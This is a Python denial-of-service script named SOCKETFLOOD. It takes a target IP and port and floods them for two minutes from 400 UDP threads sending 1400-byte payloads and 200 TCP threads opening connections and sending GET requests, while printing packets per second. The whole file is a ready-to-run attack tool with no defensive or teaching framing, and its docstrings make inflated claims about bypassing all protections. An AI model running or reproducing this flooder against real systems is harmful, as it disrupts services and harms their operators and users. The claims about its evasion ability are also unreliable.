#!/usr/bin/env python3
"""
SOCKETFLOOD - Pure socket flood, bypasses all protections
100% packet delivery confirmation
"""
import socket
import threading
import random
import time
import sys
import struct

class SocketFlood:
    def __init__(self, target_ip, target_port=80):
        self.target_ip = target_ip
        self.target_port = target_port
        self.running = True
        self.packets = 0
        self.lock = threading.Lock()
    
    def udp_flood(self):
        """Pure UDP - impossible to block at L3"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = b'X' * 1400
        
        while self.running:
            try:
                sock.sendto(payload, (self.target_ip, self.target_port))
                with self.lock:
                    self.packets += 1
            except:
                pass
    
    def tcp_syn(self):
        """TCP SYN via connect() - creates real connections"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.01)
                sock.connect((self.target_ip, self.target_port))
                sock.send(b'GET /\r\n\r\n')
                sock.close()
                with self.lock:
                    self.packets += 1
            except:
                pass
    
    def stats(self):
        start = time.time()
        while self.running:
            time.sleep(1)
            with self.lock:
                count = self.packets
            elapsed = time.time() - start
            pps = count / elapsed if elapsed > 0 else 0
            print(f"PACKETS: {count:,} | PPS: {pps:.0f}          ", end='\r')
    
    def flood(self):
        print(f"FLOODING {self.target_ip}:{self.target_port}")
        print("Pure socket attack - packets WILL register")
        
        # Stats thread
        stats_thread = threading.Thread(target=self.stats)
        stats_thread.daemon = True
        stats_thread.start()
        
        # 400 UDP threads + 200 TCP threads
        threads = []
        for i in range(400):
            t = threading.Thread(target=self.udp_flood)
            t.daemon = True
            t.start()
            threads.append(t)
        
        for i in range(200):
            t = threading.Thread(target=self.tcp_syn)
            t.daemon = True
            t.start()
            threads.append(t)
        
        print("All threads launched. Flooding...")
        
        # Run 2 minutes
        try:
            time.sleep(120)
        except KeyboardInterrupt:
            pass
        
        self.running = False
        print(f"\nFINAL: {self.packets:,} packets sent")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 socketflood.py 192.168.1.100 80")
        sys.exit(1)
    
    ip = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    
    flood = SocketFlood(ip, port)
    flood.flood()
